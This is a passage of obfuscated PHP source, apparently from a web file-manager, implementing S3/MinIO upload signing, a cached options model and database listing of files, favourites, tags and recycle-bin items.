public function multiUploadAuthData($…Ê£Æï®, $ÒÎâè¸ = array()) { $¿ÙŠóø„ =& $_SERVER[è¶³ÒßÑ]; $Üğéëµ = isset($ÒÎâè¸[$¿ÙŠóø„[265]]) ? $ÒÎâè¸[$¿ÙŠóø„[265]] : gmdate($¿ÙŠóø„[263]); $‚âÖ˜á = isset($ÒÎâè¸[$¿ÙŠóø„[179]]) ? $ÒÎâè¸[$¿ÙŠóø„[179]] : $¿ÙŠóø„[12]; $ßç€Ÿ”Á = $ÒÎâè¸[$¿ÙŠóø„[107]]; unset($ÒÎâè¸[$¿ÙŠóø„[107]]); if (isset($ÒÎâè¸[$¿ÙŠóø„[266]])) { $ÒÎâè¸[$¿ÙŠóø„[265]] = $Üğéëµ; return $this->listUploadParts($ßç€Ÿ”Á, $ÒÎâè¸); } $¡«¸åÊí = array($¿ÙŠóø„[267], $¿ÙŠóø„[12], $¿ÙŠóø„[133], $¿ÙŠóø„[12], "\170\x2d\141\x6d\x7a\55\x64\x61\164\145\72{$Üğéëµ}", $¿ÙŠóø„[8] . $this->bucket . $¿ÙŠóø„[8] . $this->pathEncode($ßç€Ÿ”Á) . $‚âÖ˜á); if (strpos($‚âÖ˜á, $¿ÙŠóø„[268]) === 0) { $¡«¸åÊí[0] = $¿ÙŠóø„[269]; } if (isset($ÒÎâè¸[$¿ÙŠóø„[270]]) && $ÒÎâè¸[$¿ÙŠóø„[270]] == $¿ÙŠóø„[271]) { $¡«¸åÊí[0] = $¿ÙŠóø„[271]; } $âÇ§ÅÁ¸ = implode($¿ÙŠóø„[60], $¡«¸åÊí); $õØ–ÕôÍ = base64_encode(hash_hmac($¿ÙŠóø„[272], $âÇ§ÅÁ¸, $this->secret, !0)); $™´ô…ñÑ = $¿ÙŠóø„[273] . $this->accessKey . $¿ÙŠóø„[4] . $õØ–ÕôÍ; if (strpos($‚âÖ˜á, $¿ÙŠóø„[268]) === 0) { return array($¿ÙŠóø„[274] => $™´ô…ñÑ, $¿ÙŠóø„[265] => $Üğéëµ); } return $™´ô…ñÑ; } public function listUploadParts($í›”‘ö, $îÌ®“çÑ = array()) { $¢ëÛ¢¿Ó =& $_SERVER[è¶³ÒßÑ]; $´¥úƒè™ = str_replace($¢ëÛ¢¿Ó[275], $¢ëÛ¢¿Ó[12], $îÌ®“çÑ[$¢ëÛ¢¿Ó[179]]); $Ÿ«¤ÔÓ« = $this->client->listParts($this->bucket, $í›”‘ö, $´¥úƒè™); if (!$Ÿ«¤ÔÓ«) { return !1; } unset($îÌ®“çÑ[$¢ëÛ¢¿Ó[266]], $îÌ®“çÑ[$¢ëÛ¢¿Ó[270]]); $îÌ®“çÑ[$¢ëÛ¢¿Ó[107]] = $í›”‘ö; $… ó°«õ = $this->multiUploadAuthData($í›”‘ö, $îÌ®“çÑ); if (empty($… ó°«õ)) { return !1; } return array($¢ëÛ¢¿Ó[274] => $… ó°«õ, $¢ëÛ¢¿Ó[265] => $îÌ®“çÑ[$¢ëÛ¢¿Ó[265]], $¢ëÛ¢¿Ó[276] => $Ÿ«¤ÔÓ«); } public function getHost() { $›Ş„úì =& $_SERVER[è¶³ÒßÑ]; $Ÿæ¾¥“¥ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($›Ş„úì[80], $›Ş„úì[74], $›Ş„úì[79], $›Ş„úì[72]))) { return $Ÿæ¾¥“¥ . $›Ş„úì[8] . $this->bucket; } $Ÿæ¾¥“¥ = explode($›Ş„úì[220], $Ÿæ¾¥“¥); return $Ÿæ¾¥“¥[0] . $›Ş„úì[220] . $this->bucket . $›Ş„úì[10] . $Ÿæ¾¥“¥[1]; } public function size($ÔÁù÷«Ø) { $ü‰ù°îÆ = $this->objectMeta($ÔÁù÷«Ø); return $ü‰ù°îÆ ? $ü‰ù°îÆ[$_SERVER[è¶³ÒßÑ][89]] : 0; } public function info($Ó¼Õ€€ï) { if ($this->isFolder($Ó¼Õ€€ï)) { return $this->folderInfo($Ó¼Õ€€ï); } else { if ($this->isFile($Ó¼Õ€€ï)) { return $this->fileInfo($Ó¼Õ€€ï); } } return !1; } public function exist($²óŸñÛ›) { return $this->isFile($²óŸñÛ›) || $this->isFolder($²óŸñÛ›); } public function isFile($Æà Ã¯§) { return !$this->isFolder($Æà Ã¯§) && $this->objectMeta($Æà Ã¯§); } public function isFolder($ïÄ–ê”ì) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][189], $ïÄ–ê”ì); } protected function objectMeta($„òåæÍÂ) { return $this->cacheMethod($_SERVER[è¶³ÒßÑ][191], $„òåæÍÂ); } protected function _objectMeta($ÕÊñ¾à·) { $€¢ÍÎŒ‘ =& $_SERVER[è¶³ÒßÑ]; $ÕÊñ¾à· = rtrim($ÕÊñ¾à·, $€¢ÍÎŒ‘[8]); try { $È÷ºÊ«Ï = $this->client->getObjectInfo($this->bucket, $ÕÊñ¾à·); if (!isset($È÷ºÊ«Ï[$€¢ÍÎŒ‘[262]]) && isset($È÷ºÊ«Ï[$€¢ÍÎŒ‘[277]])) { $È÷ºÊ«Ï[$€¢ÍÎŒ‘[262]] = $È÷ºÊ«Ï[$€¢ÍÎŒ‘[277]]; } } catch (Exception $¶º•Î¢) { $È÷ºÊ«Ï = !1; } if (!$È÷ºÊ«Ï) { } return $È÷ºÊ«Ï; } protected function _isFolder($ÎØÈÂÄû) { $ü¨ØìÀÉ =& $_SERVER[è¶³ÒßÑ]; $ÎØÈÂÄû = rtrim($ÎØÈÂÄû, $ü¨ØìÀÉ[8]); if ($ÎØÈÂÄû == $ü¨ØìÀÉ[12] || $ÎØÈÂÄû == $ü¨ØìÀÉ[8]) { return !0; } $·ıàá£Á = $this->client->getBucket($this->bucket, $ÎØÈÂÄû, null, 1); if (empty($·ıàá£Á[$ü¨ØìÀÉ[246]])) { return !1; } $•¥îıİ™ = $·ıàá£Á[$ü¨ØìÀÉ[246]][0][$ü¨ØìÀÉ[32]]; return stripos($•¥îıİ™, $ÎØÈÂÄû . $ü¨ØìÀÉ[8]) === 0 ? !0 : !1; if (substr($•¥îıİ™, -1) == $ü¨ØìÀÉ[8]) { return !0; } if (get_path_this($•¥îıİ™) == get_path_this($ÎØÈÂÄû)) { return !1; } return !0; } public function listObject($Ø™½ø¢£) { return $this->fileList($Ø™½ø¢£, $_SERVER[è¶³ÒßÑ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($«‘¼Ø®) { $ùú“²” =& $_SERVER[è¶³ÒßÑ]; parent::__construct($«‘¼Ø®); $this->setSignVersion($ùú“²”[257]); if (!$this->region) { $this->region = $ùú“²”[278]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $“Êš¼ÖÕ = $this->getBucketRgn(); return $this->region == $“Êš¼ÖÕ ? !0 : !1; } public function uploadFormData($¬šÀĞÚ, $Ş‘½”¯É = 3600) { $òˆ°øá =& $_SERVER[è¶³ÒßÑ]; $ÒÓùÚ¿… = $òˆ°øá[239]; $ÊĞîÎ€ğ = $òˆ°øá[279]; $È„°ğ¬ó = $òˆ°øá[72]; $ñÉë³™ü = gmdate($òˆ°øá[280]); $ä÷ß«İê = gmdate($òˆ°øá[281]); $ØìŠÕÌ = $òˆ°øá[282]; $¿÷’É‚ı = $Ş‘½”¯É . $òˆ°øá[12]; $ŞÇ›·Àñ = $òˆ°øá[283]; $†©¿´ï¨ = array($this->accessKey, $ä÷ß«İê, $this->region, $È„°ğ¬ó, $ØìŠÕÌ); $ß¶ïÈ¼Ÿ = implode($òˆ°øá[8], $†©¿´ï¨); $êö¡ĞÓ¬ = array($òˆ°øá[284] => gmdate($òˆ°øá[285], strtotime($òˆ°øá[286])), $òˆ°øá[287] => array(array($òˆ°øá[288] => $this->bucket), array($òˆ°øá[289] => $ÒÓùÚ¿…), array($òˆ°øá[290], $òˆ°øá[291], $òˆ°øá[12]), array($òˆ°øá[290], $òˆ°øá[292], $òˆ°øá[12]), array($òˆ°øá[290], $òˆ°øá[293], $òˆ°øá[12]), array($òˆ°øá[294] => $ŞÇ›·Àñ), array($òˆ°øá[295] => $ß¶ïÈ¼Ÿ), array($òˆ°øá[296] => $ÊĞîÎ€ğ), array($òˆ°øá[297] => $ñÉë³™ü), array($òˆ°øá[298] => $¿÷’É‚ı))); $ÌŞ¹Öòƒ = base64_encode(json_encode($êö¡ĞÓ¬)); $¿¬úÛç = hash_hmac($òˆ°øá[299], $ä÷ß«İê, $òˆ°øá[300] . $this->secret, !0); $ÓÈ¼ä“‰ = hash_hmac($òˆ°øá[299], $this->region, $¿¬úÛç, !0); $ª‹÷õâò = hash_hmac($òˆ°øá[299], $È„°ğ¬ó, $ÓÈ¼ä“‰, !0); $¯ ¹™Ó‹ = hash_hmac($òˆ°øá[299], $ØìŠÕÌ, $ª‹÷õâò, !0); $‰·ÊìÌÕ = hash_hmac($òˆ°øá[299], $ÌŞ¹Öòƒ, $¯ ¹™Ó‹); $Âš¾ĞÅ = array($òˆ°øá[256] => $òˆ°øá[12], $òˆ°øá[301] => $òˆ°øá[12], $òˆ°øá[289] => $ÒÓùÚ¿…, $òˆ°øá[294] => $ŞÇ›·Àñ, $òˆ°øá[302] => $ÌŞ¹Öòƒ, $òˆ°øá[303] => $ß¶ïÈ¼Ÿ, $òˆ°øá[304] => $ÊĞîÎ€ğ, $òˆ°øá[305] => $ñÉë³™ü, $òˆ°øá[306] => $¿÷’É‚ı, $òˆ°øá[307] => $‰·ÊìÌÕ, $òˆ°øá[218] => $this->getHost()); return $Âš¾ĞÅ; } } goto AŒàôŠ…êÂ; aÑá¶ù­òİ: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($™‰äú¨Ó = false, $«óıüÊì = '', $ƒöªıÜ€ = false) { $äÊÏƒèÕ =& $_SERVER[è¶³ÒßÑ]; $™ø×Û — = $this->cacheGet($«óıüÊì); $°Í•Ğ‡ş = $this->optionDefault($«óıüÊì); $°Í•Ğ‡ş = is_array($°Í•Ğ‡ş) ? $°Í•Ğ‡ş : array(); if (is_array($™ø×Û —)) { $™ø×Û — = array_merge($°Í•Ğ‡ş, $™ø×Û —); return $™‰äú¨Ó ? isset($™ø×Û —[$™‰äú¨Ó]) ? $™ø×Û —[$™‰äú¨Ó] : null : $™ø×Û —; } $˜„ ¶½¶ = $this->filterWhere(array($äÊÏƒèÕ[33] => $«óıüÊì)); $™ø×Û — = $this->where($˜„ ¶½¶)->select(); $™ø×Û — = array_to_keyvalue($™ø×Û —, $äÊÏƒèÕ[107], $äÊÏƒèÕ[443]); foreach ($™ø×Û — as $µÎŞêÓà => $–¬ĞíÇ´) { if ($ƒöªıÜ€ || in_array($µÎŞêÓà, $this->jsonField)) { $™ø×Û —[$µÎŞêÓà] = json_decode($–¬ĞíÇ´, !0); } } $this->cacheSet($«óıüÊì, $™ø×Û —); $™ø×Û — = array_merge($°Í•Ğ‡ş, $™ø×Û —); return $™‰äú¨Ó ? $™ø×Û —[$™‰äú¨Ó] : $™ø×Û —; } public function set($âÓÀñÁ, $´ãªøÆø = false, $œığÎ® = '') { $§ÏÚ‹·‚ =& $_SERVER[è¶³ÒßÑ]; $this->cacheRemove($œığÎ®); $¦¥““‹€ = array(); $¥Ç½¡¤ø = is_array($âÓÀñÁ) ? $âÓÀñÁ : array($âÓÀñÁ => $´ãªøÆø); foreach ($¥Ç½¡¤ø as $Š™Éòş => $Ò¶ôƒôâ) { if (is_array($Ò¶ôƒôâ)) { $Ò¶ôƒôâ = json_encode_force($Ò¶ôƒôâ); } $this->checkLength($Ò¶ôƒôâ, !1, $this->tableName . $§ÏÚ‹·‚[4] . $âÓÀñÁ); $Ò¶ôƒôâ = self::textEncode($Ò¶ôƒôâ); $¥Ç½¡¤ø = array($§ÏÚ‹·‚[33] => $œığÎ®, $§ÏÚ‹·‚[107] => $Š™Éòş, $§ÏÚ‹·‚[443] => $Ò¶ôƒôâ); $¦¥““‹€[] = $this->filterWhere($¥Ç½¡¤ø); } if (!$¦¥““‹€) { return !0; } $†îµµ·« = $this->cacheKey($§ÏÚ‹·‚[469]); CacheLock::lock($†îµµ·«); $§¯éÈé» = $this->addAll($¦¥““‹€, array(), !0); CacheLock::unlock($†îµµ·«); return $§¯éÈé»; } protected function optionDefault($ğÁÅ‚Ö = '') { return !1; } public function setDeep($Ë¦µÔ¥¼, $éûûÆ¬Ï = false, $£”çñˆæ = '') { $Ëù¤ÁÛ = explode($_SERVER[è¶³ÒßÑ][10], $Ë¦µÔ¥¼); $ùÔ¾´¨ = $this->get(); array_set_value($ùÔ¾´¨, $Ë¦µÔ¥¼, $éûûÆ¬Ï); $this->set($Ëù¤ÁÛ[0], $ùÔ¾´¨[$Ëù¤ÁÛ[0]], $£”çñˆæ); } public function remove($õ´†³ƒ, $×¾¸¹óï = '') { $Ë¦“àÆ‡ =& $_SERVER[è¶³ÒßÑ]; $this->cacheRemove($×¾¸¹óï); $Ì…ÖÃú¹ = $this->filterWhere(array($Ë¦“àÆ‡[107] => $õ´†³ƒ, $Ë¦“àÆ‡[33] => $×¾¸¹óï)); if (is_null($õ´†³ƒ)) { unset($Ì…ÖÃú¹[$Ë¦“àÆ‡[107]]); } return $this->where($Ì…ÖÃú¹)->delete(); } public function cacheSet($¥äèßÌ², $Š¶…÷ = false) { return Cache::set($this->cacheKey($¥äèßÌ²), $Š¶…÷); } public function cacheGet($ƒˆ¸œ˜¸) { return Cache::get($this->cacheKey($ƒˆ¸œ˜¸)); } public function cacheRemove($ğ’üËæ…) { return Cache::remove($this->cacheKey($ğ’üËæ…)); } protected function filterWhere($«×Í®) { return $«×Í®; } protected function cacheKey($’ß—ŞÙ) { return $’ß—ŞÙ; } } class SourceListModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\x72\x63\145"; protected $tableMeta = array("\164\141\142\154\145\116\x61\155\145" => "\x69\x6f\x5f\x73\157\165\x72\x63\x65\x5f\x6d\145\164\141", "\155\x65\164\141\106\151\145\x6c\144" => "\x73\x6f\x75\x72\x63\145\x49\x44"); protected $dataAuto = array(array("\155\157\144\151\x66\171\124\151\155\145", "\x74\151\155\145", "\151\156\x73\x65\x72\x74", "\146\x75\156\x63\x74\151\157\x6e"), array("\143\162\145\x61\x74\x65\124\x69\155\145", "\x74\151\155\x65", "\151\156\163\145\162\x74", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x76\151\x65\167\124\x69\155\145", "\164\151\x6d\145", "\151\156\163\x65\x72\164", "\146\165\156\x63\x74\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÛöÑ¥ïÔ) { return $this->listSource(array($_SERVER[è¶³ÒßÑ][470] => $ÛöÑ¥ïÔ)); } public function typeName($…ñ—é¯”) { static $û€Õ›ªš = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\145\155", self::TYPE_USER => "\165\163\145\162", self::TYPE_GROUP => "\147\x72\x6f\165\160"); return $û€Õ›ªš[$…ñ—é¯” . $_SERVER[è¶³ÒßÑ][12]]; } public function sourceListInfo($¤¤ı¢í³, $€¢‘à = false) { $Ë‡ëÉş± =& $_SERVER[è¶³ÒßÑ]; $¤¤ı¢í³ = $¤¤ı¢í³ ? $¤¤ı¢í³ : array(); $¤¤ı¢í³ = array_filter(array_unique($¤¤ı¢í³)); if (!$¤¤ı¢í³) { return array(); } $ï²Ñô¨ø = $this->where(array($Ë‡ëÉş±[203] => array($Ë‡ëÉş±[7], $¤¤ı¢í³)))->select(); $this->_listDataApply($ï²Ñô¨ø, $€¢‘à); return array_to_keyvalue($ï²Ñô¨ø, $Ë‡ëÉş±[203]); } public function pathInfoFilter(&$ÛğÑ×»Æ) { $´ì–›û¦ =& $_SERVER[è¶³ÒßÑ]; static $–ºä¯°œ = false; static $ˆŒ¼…‡î = false; static $´ƒÌÆ¼… = false; if (!$–ºä¯°œ) { $––À÷Ù˜ = $´ì–›û¦[471]; $––À÷Ù˜ .= $´ì–›û¦[472]; $––À÷Ù˜ .= $´ì–›û¦[473]; $ŠÀëƒÉ = $´ì–›û¦[474]; $–¥ßÌä´ = explode($´ì–›û¦[50], $ŠÀëƒÉ); $–ºä¯°œ = explode($´ì–›û¦[50], $––À÷Ù˜); $ˆŒ¼…‡î = array(); foreach ($–ºä¯°œ as $ˆ†‘á¨á) { if (in_array($ˆ†‘á¨á, $–¥ßÌä´)) { continue; } $ˆŒ¼…‡î[] = $ˆ†‘á¨á; } $´ƒÌÆ¼… = explode($´ì–›û¦[50], $´ì–›û¦[475]); } foreach ($´ƒÌÆ¼… as $Ş‚‡½áö) { if (isset($ÛğÑ×»Æ[$Ş‚‡½áö])) { $ÛğÑ×»Æ[$Ş‚‡½áö] = intval($ÛğÑ×»Æ[$Ş‚‡½áö]); } } $ÛğÑ×»Æ[$´ì–›û¦[97]] = $´ì–›û¦[476] . $ÛğÑ×»Æ[$´ì–›û¦[203]] . $´ì–›û¦[477]; $ÛğÑ×»Æ[$´ì–›û¦[33]] = $ÛğÑ×»Æ[$´ì–›û¦[478]] == 1 ? $´ì–›û¦[88] : $´ì–›û¦[240]; $ÛğÑ×»Æ[$´ì–›û¦[200]] = $this->typeName($ÛğÑ×»Æ[$´ì–›û¦[200]]); if ($ÛğÑ×»Æ[$´ì–›û¦[478]] != 1) { $ÛğÑ×»Æ[$´ì–›û¦[179]] = $ÛğÑ×»Æ[$´ì–›û¦[479]]; unset($ÛğÑ×»Æ[$´ì–›û¦[479]]); } $Èò¸¨ = $–ºä¯°œ; if (isset($ÛğÑ×»Æ[$´ì–›û¦[480]]) && $ÛğÑ×»Æ[$´ì–›û¦[480]][$´ì–›û¦[481]] == -1) { $Èò¸¨ = $ˆŒ¼…‡î; } $ÛğÑ×»Æ = array_field_key($ÛğÑ×»Æ, $Èò¸¨); return $ÛğÑ×»Æ; } public function listUserFav() { $ù·Ó£î¯ =& $_SERVER[è¶³ÒßÑ]; $º¯ğ¬‹ı = Model($ù·Ó£î¯[482])->listData(); $€·÷ÅŞ = array_filter_by_field($º¯ğ¬‹ı, $ù·Ó£î¯[33], $ù·Ó£î¯[483]); $€·÷ÅŞ = array_to_keyvalue($€·÷ÅŞ, $ù·Ó£î¯[12], $ù·Ó£î¯[97]); if ($€·÷ÅŞ) { $šä¥õ©í = $this->listSource(array($ù·Ó£î¯[484] => array($ù·Ó£î¯[485], $€·÷ÅŞ))); } $šä¥õ©í = array_to_keyvalue($šä¥õ©í[$ù·Ó£î¯[438]], $ù·Ó£î¯[203]); foreach ($º¯ğ¬‹ı as &$•©²Í¡) { $•©²Í¡ = array($ù·Ó£î¯[486] => $•©²Í¡[$ù·Ó£î¯[468]], $ù·Ó£î¯[487] => $•©²Í¡[$ù·Ó£î¯[32]], $ù·Ó£î¯[488] => $•©²Í¡[$ù·Ó£î¯[97]], $ù·Ó£î¯[489] => $•©²Í¡[$ù·Ó£î¯[33]], $ù·Ó£î¯[490] => $•©²Í¡[$ù·Ó£î¯[241]], $ù·Ó£î¯[491] => $•©²Í¡[$ù·Ó£î¯[98]]); if ($•©²Í¡[$ù·Ó£î¯[33]] == $ù·Ó£î¯[483] && $šä¥õ©í[$•©²Í¡[$ù·Ó£î¯[97]]]) { $•©²Í¡[$ù·Ó£î¯[100]] = $šä¥õ©í[$•©²Í¡[$ù·Ó£î¯[97]]]; } } unset($•©²Í¡); return $º¯ğ¬‹ı; } public function listUserTag($°ÕåÌèï) { $Şà¾–í£ =& $_SERVER[è¶³ÒßÑ]; if ($°ÕåÌèï && !is_array($°ÕåÌèï)) { $°ÕåÌèï = array($°ÕåÌèï); } $¾‹÷àÈØ = Model($Şà¾–í£[492])->listData(); $ùŞ¾ãÃ´ = array(); $¥ÔàˆçÛ = array(); foreach ($¾‹÷àÈØ as $³×ÏÚÑù) { $‰ÏÆ°Å = $³×ÏÚÑù[$Şà¾–í£[97]]; if (!$‰ÏÆ°Å) { continue; } if (!isset($¥ÔàˆçÛ[$‰ÏÆ°Å])) { $¥ÔàˆçÛ[$‰ÏÆ°Å] = array(); } $¥ÔàˆçÛ[$‰ÏÆ°Å][] = $³×ÏÚÑù[$Şà¾–í£[493]]; $ùŞ¾ãÃ´[$³×ÏÚÑù[$Şà¾–í£[97]]] = $³×ÏÚÑù; } $Ç¬³ÍÕò = array(); $ó ğå = array(); $”Ö«è¾Õ = array(); foreach ($¥ÔàˆçÛ as $É‰Õ”É => $Úõª·Ë¤) { $äÎšç¢Í = !0; if (!$°ÕåÌèï) { $Ç¬³ÍÕò[] = $É‰Õ”É; continue; } foreach ($°ÕåÌèï as $¯¤êç¡¬) { if (!in_array($¯¤êç¡¬, $Úõª·Ë¤)) { $äÎšç¢Í = !1; break; } } if (!$äÎšç¢Í) { continue; } if (!is_numeric($É‰Õ”É)) { $äÒ¢®Ä¯ = $ùŞ¾ãÃ´[$É‰Õ”É]; $‚ìôğàŸ = array($Şà¾–í£[32] => $äÒ¢®Ä¯[$Şà¾–í£[32]], $Şà¾–í£[97] => $äÒ¢®Ä¯[$Şà¾–í£[97]], $Şà¾–í£[33] => $äÒ¢®Ä¯[$Şà¾–í£[33]], $Şà¾–í£[100] => array($Şà¾–í£[494] => 1), $Şà¾–í£[242] => !0); if ($äÒ¢®Ä¯[$Şà¾–í£[33]] == $Şà¾–í£[240]) { $”Ö«è¾Õ[] = $‚ìôğàŸ; } if ($äÒ¢®Ä¯[$Şà¾–í£[33]] == $Şà¾–í£[88]) { $ó ğå[] = $‚ìôğàŸ; } continue; } $Ç¬³ÍÕò[] = $É‰Õ”É; } if ($Ç¬³ÍÕò) { $éäÓíê = $this->listSource(array($Şà¾–í£[484] => array($Şà¾–í£[485], $Ç¬³ÍÕò))); } $éäÓíê = $éäÓíê ? $éäÓíê : array($Şà¾–í£[95] => array(), $Şà¾–í£[96] => array()); $éäÓíê[$Şà¾–í£[95]] = array_merge($éäÓíê[$Şà¾–í£[95]], $ó ğå); $éäÓíê[$Şà¾–í£[96]] = array_merge($éäÓíê[$Şà¾–í£[96]], $”Ö«è¾Õ); if (isset($éäÓíê[$Şà¾–í£[435]]) && count($Ç¬³ÍÕò) == $éäÓíê[$Şà¾–í£[435]][$Şà¾–í£[436]]) { return $éäÓíê; } $Şæ½‘Š = array(); $¤Ëã€ƒ = array_to_keyvalue($éäÓíê[$Şà¾–í£[95]], $Şà¾–í£[12], $Şà¾–í£[203]); $óí›Š‹ø = array_to_keyvalue($éäÓíê[$Şà¾–í£[96]], $Şà¾–í£[12], $Şà¾–í£[203]); $åïŞş” = array_merge($óí›Š‹ø, $¤Ëã€ƒ); foreach ($Ç¬³ÍÕò as $‰ÏÆ°Å) { if (!in_array($‰ÏÆ°Å, $åïŞş”)) { $Şæ½‘Š[] = $‰ÏÆ°Å; } } if ($Şæ½‘Š) { Model($Şà¾–í£[495])->removeBySource($Şæ½‘Š); } return $éäÓíê; } public function listUserRecycle() { $Ìî›ÖÕÒ =& $_SERVER[è¶³ÒßÑ]; $©Ÿ´Îà¿ = Model($Ìî›ÖÕÒ[496])->listData(); if (!$©Ÿ´Îà¿) { return array(); } $Ş äÃš¼ = array($Ìî›ÖÕÒ[484] => array($Ìî›ÖÕÒ[485], $©Ÿ´Îà¿), $Ìî›ÖÕÒ[497] => 1); return $this->listSource($Ş äÃš¼); } public function listSource($ïËöÃÀŸ, $Öü€é…ƒ = 3000, $á±¦Ñ = false) { $¬îë“ë =& $_SERVER[è¶³ÒßÑ]; if (!isset($ïËöÃÀŸ[$¬îë“ë[498]])) { $ïËöÃÀŸ[$¬îë“ë[498]] = 0; } if (isset($ïËöÃÀŸ[$¬îë“ë[202]]) && $ïËöÃÀŸ[$¬îë“ë[202]] == $¬îë“ë[238]) { $ïËöÃÀŸ[$¬îë“ë[479]] = array($¬îë“ë[400], $¬îë“ë[499]); } $¡¼Éı‰ = $¬îë“ë[500]; $îÆçİ§ = $this->field($¡¼Éı‰)->_makeOrder()->where($ïËöÃÀŸ)->selectPage($Öü€é…ƒ); $this->_listPageCheck($îÆçİ§, $¡¼Éı‰, $ïËöÃÀŸ); $this->_listDataApply($îÆçİ§[$¬îë“ë[438]], $á±¦Ñ); $this->_listMake($îÆçİ§); return $îÆçİ§; } private function _listPageCheck(&$‚ÉÀ‰å¸, $á´Æ”Õä, $—ùåş·‘) { $ğšÙÇ˜á =& $_SERVER[è¶³ÒßÑ]; if (!is_array($‚ÉÀ‰å¸[$ğšÙÇ˜á[435]])) { return; } $Ş¯‘—ø¸ = $‚ÉÀ‰å¸[$ğšÙÇ˜á[435]]; if ($Ş¯‘—ø¸[$ğšÙÇ˜á[437]] <= 1) { return; } if ($Ş¯‘—ø¸[$ğšÙÇ˜á[436]] >= 100000) { return; } if (Model($ğšÙÇ˜á[501])->get($ğšÙÇ˜á[502]) != $ğšÙÇ˜á[503]) { return; } $á´Æ”Õä = str_replace(array($ğšÙÇ˜á[53], $ğšÙÇ˜á[411], $ğšÙÇ˜á[60]), $ğšÙÇ˜á[12], $á´Æ”Õä); $á´Æ”Õä = $ğšÙÇ˜á[504] . str_replace($ğšÙÇ˜á[50], $ğšÙÇ˜á[505], $á´Æ”Õä) . $ğšÙÇ˜á[506]; $¼¤û³·ø = $ğšÙÇ˜á[507]; $¼¤û³·ø = $¼¤û³·ø . $ğšÙÇ˜á[508]; $²…™¡Æ€ = $Ş¯‘—ø¸[$ğšÙÇ˜á[432]] * ($Ş¯‘—ø¸[$ğšÙÇ˜á[422]] - 1) . $ğšÙÇ˜á[50] . $Ş¯‘—ø¸[$ğšÙÇ˜á[432]]; $êªØ‰à = $this->_makeOrder(!0); $ô¦µÕ‡ = $ğšÙÇ˜á[504] . str_replace($ğšÙÇ˜á[50], $ğšÙÇ˜á[505], $êªØ‰à[0]); if (strpos($ô¦µÕ‡, $ğšÙÇ˜á[509])) { $ô¦µÕ‡ = str_replace($ğšÙÇ˜á[509], $ğšÙÇ˜á[510], $ô¦µÕ‡); } else { $ô¦µÕ‡ .= $ğšÙÇ˜á[511] . $êªØ‰à[1]; } $—¯ƒ¯„ = array(); foreach ($—ùåş·‘ as $æ˜¿‹†î => $¬ŠöÎÃ) { $—¯ƒ¯„[$ğšÙÇ˜á[504] . $æ˜¿‹†î] = $¬ŠöÎÃ; } $this->alias($ğšÙÇ˜á[512])->field($á´Æ”Õä)->limit($²…™¡Æ€)->order($ô¦µÕ‡); $Ìä‚é“ = $this->join($¼¤û³·ø)->where($—¯ƒ¯„)->select(); if ($Ìä‚é“) { $‚ÉÀ‰å¸[$ğšÙÇ˜á[438]] = $Ìä‚é“; } } protected function _makeOrder($ØÜÏªØÚ = false) { $ø¬íë£ =& $_SERVER[è¶³ÒßÑ]; $ç¯è°šÁ = Model($ø¬íë£[513])->get($ø¬íë£[514]); $§é•¼ß“ = Model($ø¬íë£[513])->get($ø¬íë£[515]); $ô‹ë„ú = array($ø¬íë£[516] => $ø¬íë£[517], $ø¬íë£[518] => $ø¬íë£[519]); $Ş×æöİ‘ = array($ø¬íë£[32] => $ø¬íë£[32], $ø¬íë£[89] => $ø¬íë£[89], $ø¬íë£[179] => $ø¬íë£[479], $ø¬íë£[520] => $ø¬íë£[520], $ø¬íë£[521] => $ø¬íë£[522], $ø¬íë£[241] => $ø¬íë£[241], $ø¬íë£[98] => $ø¬íë£[98]); $÷ÌÖü¶ò = Input::get($ø¬íë£[523], $ø¬íë£[7], $ç¯è°šÁ, array_keys($Ş×æöİ‘)); $£±€ãâã = Input::get($ø¬íë£[524], $ø¬íë£[7], $§é•¼ß“, array_keys($ô‹ë„ú)); if (!in_array($÷ÌÖü¶ò, array_keys($Ş×æöİ‘))) { $÷ÌÖü¶ò = $ø¬íë£[32]; } if (!in_array($£±€ãâã, array_keys($ô‹ë„ú))) { $÷ÌÖü¶ò = $ø¬íë£[516]; } if ($÷ÌÖü¶ò == $ø¬íë£[32]) { } $ƒ¢èµÄ = $ø¬íë£[525] . $Ş×æöİ‘[$÷ÌÖü¶ò] . $ø¬íë£[53] . $ô‹ë„ú[$£±€ãâã]; $ƒ¢èµÄ = rtrim(trim($ƒ¢èµÄ), $ø¬íë£[50]); if ($ØÜÏªØÚ) { return array($ƒ¢èµÄ, $ô‹ë„ú[$£±€ãâã]); } return $this->order($ƒ¢èµÄ); } protected function _listDataApplyItem($ºªáãæÏ, $˜ˆ­ÀÒ = false) { $›¶…Ã… = array($ºªáãæÏ); $this->_listDataApply($›¶…Ã…, $˜ˆ­ÀÒ); return $›¶…Ã…[0]; } protected function _listDataApply(&$¨ñÑ¦áú, $ ûÎ›¸¤ = false) { $Ñ‡ïé¡ =& $_SERVER[è¶³ÒßÑ]; if (!$¨ñÑ¦áú) { $¨ñÑ¦áú = array(); return; } $ÁØ¨²¹ = array_to_keyvalue($¨ñÑ¦áú, $Ñ‡ïé¡[12], $Ñ‡ïé¡[203]); $ÁØ¨²¹ = array_unique($ÁØ¨²¹); $this->_listSourceCache($¨ñÑ¦áú); if (!$ ûÎ›¸¤) { $this->_listAppendMeta($¨ñÑ¦áú, $ÁØ¨²¹); $this->_listAppendFileMeta($¨ñÑ¦áú, $ÁØ¨²¹); $this->_listAppendChildren($¨ñÑ¦áú, $ÁØ¨²¹); } $this->_listAppendPath($¨ñÑ¦áú); $this->_listAppendAuth($¨ñÑ¦áú); $this->_listAppendSourceInfo($¨ñÑ¦áú, $ÁØ¨²¹); $this->_listAppendUser($¨ñÑ¦áú); $this->_listFilterInfo($¨ñÑ¦áú, $ ûÎ›¸¤); 